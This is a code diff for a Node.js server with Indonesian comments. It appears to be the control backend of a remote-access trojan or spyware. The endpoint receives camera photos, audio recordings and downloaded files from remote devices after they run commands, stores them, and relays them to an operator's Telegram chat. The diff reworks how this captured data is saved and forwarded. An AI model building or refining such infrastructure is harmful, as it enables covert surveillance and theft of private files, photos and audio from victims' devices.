@@ -816,18 +816,50 @@ app.post('/response', async (req, res) => {
     if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });
     await updateDeviceSeen(client_id, 'normal', ipv6, ipv4);
     let logData = { ...data };
-    try {
-        if (data.type === 'audio_base64' && data.data) {
-            const filename = `audio_${client_id}_${Date.now()}.mp4`;
-            fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data, 'base64'));
-            logData.type = 'audio_url'; logData.data = `/public/uploads/${filename}`;
-        } else if (data.type === 'photo_base64' && data.data) {
+
+    // ══ STRIP BASE64 DARI SEMUA TIPE MEDIA ══
+    // Selalu hapus base64 sebelum masuk DB untuk mencegah database bengkak.
+    // Setiap tipe dihandle terpisah agar kegagalan simpan file tidak membuat
+    // base64 ikut tersimpan di SQLite.
+
+    if (data.type === 'photo_base64' && data.data) {
+        // Strip base64 terlebih dahulu (selalu dilakukan)
+        logData.data = null;
+        logData.type = 'photo_url';
+        try {
             const filename = `photo_${client_id}_${Date.now()}.jpg`;
             fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data, 'base64'));
-            logData.type = 'photo_url'; logData.data = `/public/uploads/${filename}`;
+            logData.data = `/public/uploads/${filename}`;
+        } catch (e) {
+            logData.data = '[gagal simpan file foto]';
         }
-    } catch (e) { }
+    } else if (data.type === 'audio_base64' && data.data) {
+        logData.data = null;
+        logData.type = 'audio_url';
+        try {
+            const filename = `audio_${client_id}_${Date.now()}.mp4`;
+            fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data, 'base64'));
+            logData.data = `/public/uploads/${filename}`;
+        } catch (e) {
+            logData.data = '[gagal simpan file audio]';
+        }
+    } else if (data.type === 'file_download' && data.data && data.data.data) {
+        // file_download menyimpan base64 di data.data.data — harus distrip juga
+        const origName = data.data.name || 'file';
+        logData.data = { name: origName, url: null };
+        logData.type = 'file_download_url';
+        try {
+            const safeName = origName.replace(/[^a-zA-Z0-9._-]/g, '_');
+            const filename = `dl_${client_id}_${Date.now()}_${safeName}`;
+            fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data.data, 'base64'));
+            logData.data.url = `/public/uploads/${filename}`;
+        } catch (e) {
+            logData.data.url = '[gagal simpan file download]';
+        }
+    }
+
     await db.run('INSERT INTO system_logs (device_id, command_id, level, message) VALUES (?, ?, ?, ?)', [client_id, data.id || null, data.level || 'INFO', JSON.stringify(logData)]);
+
     if (data.id) {
         await db.run('UPDATE commands SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ['completed', data.id]);
         try {
@@ -864,24 +896,45 @@ app.post('/response', async (req, res) => {
                 };
                 if (data.type === 'audio_base64') {
                     await clearPreviousNav(cmd.chat_id);
-                    const audioBuffer = Buffer.from(deviceResponse, 'base64');
-                    const sent = await bot.telegram.sendAudio(cmd.chat_id, { source: audioBuffer, filename: `record.3gp` }, { caption: `✅ Rekaman (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
+                    let audioSource;
+                    // Baca dari file yang sudah disimpan, fallback ke buffer memory
+                    const audioUrl = logData.data;
+                    if (audioUrl && typeof audioUrl === 'string' && audioUrl.startsWith('/public/uploads/')) {
+                        audioSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(audioUrl))), filename: `record.mp4` };
+                    } else {
+                        audioSource = { source: Buffer.from(deviceResponse, 'base64'), filename: `record.mp4` };
+                    }
+                    const sent = await bot.telegram.sendAudio(cmd.chat_id, audioSource, { caption: `✅ Rekaman (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
                     if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                     if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                     return res.json({ status: 'received' });
                 }
                 if (data.type === 'photo_base64') {
                     await clearPreviousNav(cmd.chat_id);
-                    const imageBuffer = Buffer.from(deviceResponse, 'base64');
-                    const sent = await bot.telegram.sendPhoto(cmd.chat_id, { source: imageBuffer }, { caption: `📸 Foto (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
+                    let photoSource;
+                    // Baca dari file yang sudah disimpan, fallback ke buffer memory
+                    const photoUrl = logData.data;
+                    if (photoUrl && typeof photoUrl === 'string' && photoUrl.startsWith('/public/uploads/')) {
+                        photoSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(photoUrl))) };
+                    } else {
+                        photoSource = { source: Buffer.from(deviceResponse, 'base64') };
+                    }
+                    const sent = await bot.telegram.sendPhoto(cmd.chat_id, photoSource, { caption: `📸 Foto (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
                     if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                     if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                     return res.json({ status: 'received' });
                 }
                 if (data.type === 'file_download' && deviceResponse.name && deviceResponse.data) {
                     await clearPreviousNav(cmd.chat_id);
-                    const fileBuffer = Buffer.from(deviceResponse.data, 'base64');
-                    const sent = await bot.telegram.sendDocument(cmd.chat_id, { source: fileBuffer, filename: deviceResponse.name }, { caption: `✅ Download (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
+                    let docSource;
+                    // Baca dari file yang sudah disimpan, fallback ke buffer memory
+                    const dlUrl = logData.data?.url;
+                    if (dlUrl && typeof dlUrl === 'string' && dlUrl.startsWith('/public/uploads/')) {
+                        docSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(dlUrl))), filename: deviceResponse.name };
+                    } else {
+                        docSource = { source: Buffer.from(deviceResponse.data, 'base64'), filename: deviceResponse.name };
+                    }
+                    const sent = await bot.telegram.sendDocument(cmd.chat_id, docSource, { caption: `✅ Download (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
                     if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                     if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                     return res.json({ status: 'received' });
